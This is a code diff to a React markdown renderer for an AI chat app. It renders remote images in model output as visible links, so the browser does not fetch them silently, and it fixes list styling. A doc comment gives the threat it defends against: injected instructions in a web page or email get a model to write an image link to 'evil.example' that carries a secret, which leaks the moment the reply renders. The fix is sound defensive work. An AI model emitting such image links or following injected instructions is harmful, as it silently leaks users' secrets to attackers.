@@ -19,7 +19,7 @@ import { memo, useMemo, type ReactNode } from 'react';
 import ReactMarkdown from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import { Link } from 'react-router-dom';
-import { Copy, ExternalLink, FileText, Globe2 } from 'lucide-react';
+import { Copy, ExternalLink, FileText, Globe2, Image as ImageIcon } from 'lucide-react';
 import { toast } from 'sonner';
 import { cn } from '../../lib/utils';
 import { documentsHrefFor, linkablePath } from '../../lib/vfsPath';
@@ -189,6 +189,45 @@ function FilePathLink({ path }: { path: string }) {
  */
 type MarkdownNode = { node?: unknown };
 type AnchorProps = React.ComponentPropsWithoutRef<'a'> & MarkdownNode;
+type ImageProps = React.ComponentPropsWithoutRef<'img'> & MarkdownNode;
+
+/** Served by this app, so loading it tells no third party anything. */
+function isOwnOrigin(src: string): boolean {
+  if (src.startsWith('/') && !src.startsWith('//')) return true;
+  try {
+    return new URL(src, window.location.href).origin === window.location.origin;
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * A remote image in model output is a link, never an <img>.
+ *
+ * The browser fetches an <img> the moment it renders, with no click, so a
+ * reply containing `![](https://evil.example/?d=<secret>)` — written because a
+ * web page or email told the model to — would send the secret the instant the
+ * message appeared. That is the zero-click exfiltration channel. Rendered as
+ * a link, nothing leaves until the user chooses to open it and can see where.
+ */
+function RemoteImage({ src, alt }: { src?: string; alt?: string }) {
+  if (!src) return null;
+  if (isOwnOrigin(src)) {
+    return <img src={src} alt={alt ?? ''} className="max-w-full rounded-lg my-2" />;
+  }
+  return (
+    <a
+      href={src}
+      target="_blank"
+      rel="noopener noreferrer"
+      title={src}
+      className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded-md border border-border text-sm text-muted-foreground no-underline hover:text-foreground"
+    >
+      <ImageIcon className="w-3.5 h-3.5 shrink-0" />
+      {alt || 'Image'} ({hostnameOf(src)})
+    </a>
+  );
+}
 type ElementProps<T extends keyof React.JSX.IntrinsicElements> =
   React.ComponentPropsWithoutRef<T> & MarkdownNode;
 type CodeProps = React.ComponentPropsWithoutRef<'code'> & MarkdownNode & {
@@ -286,14 +325,34 @@ function MarkdownMessage({
       p: ({ node: _node, children, ...props }: ElementProps<'p'>) => (
         <p className="mb-3 last:mb-0 leading-relaxed" {...props}>{children}</p>
       ),
+      // Self-styled against ancestor resets: inside `.ai-chat-prose` the
+      // container's own `list-none` + custom `::before` bullets would otherwise
+      // win on specificity and draw every list twice (or, where its padding
+      // wins and its marker loses, not at all). The overrides below restore
+      // this component's markers and silence the container's.
       ul: ({ node: _node, children, ...props }: ElementProps<'ul'>) => (
-        <ul className="list-disc pl-6 mb-3 space-y-1.5 marker:text-primary" {...props}>{children}</ul>
+        <ul
+          className="list-disc pl-6 mb-3 space-y-1.5 marker:text-primary [.ai-chat-prose_&]:list-disc [.ai-chat-prose_&]:pl-6"
+          {...props}
+        >
+          {children}
+        </ul>
       ),
       ol: ({ node: _node, children, ...props }: ElementProps<'ol'>) => (
-        <ol className="list-decimal pl-6 mb-3 space-y-1.5 marker:text-primary marker:font-bold" {...props}>{children}</ol>
+        <ol
+          className="list-decimal pl-6 mb-3 space-y-1.5 marker:text-primary marker:font-bold [.ai-chat-prose_&]:list-decimal [.ai-chat-prose_&]:pl-6"
+          {...props}
+        >
+          {children}
+        </ol>
       ),
       li: ({ node: _node, children, ...props }: ElementProps<'li'>) => (
-        <li className="leading-relaxed [&>p]:mb-1" {...props}>{children}</li>
+        <li
+          className="leading-relaxed [&>p]:mb-1 [.ai-chat-prose_&]:pl-0 [.ai-chat-prose_&::before]:content-none"
+          {...props}
+        >
+          {children}
+        </li>
       ),
       blockquote: ({ node: _node, children, ...props }: ElementProps<'blockquote'>) => (
         <blockquote className="border-l-2 border-primary/40 pl-3 my-3 italic text-muted-foreground" {...props}>{children}</blockquote>
@@ -317,6 +376,9 @@ function MarkdownMessage({
       ),
       hr: ({ node: _node, ...props }: ElementProps<'hr'>) => (
         <hr className="my-4 border-border" {...props} />
+      ),
+      img: ({ node: _node, src, alt }: ImageProps) => (
+        <RemoteImage src={typeof src === 'string' ? src : undefined} alt={alt} />
       ),
       pre: ({ node: _node, children, ...props }: ElementProps<'pre'>) => (
         <pre className="my-3 overflow-x-auto" {...props}>{children}</pre>
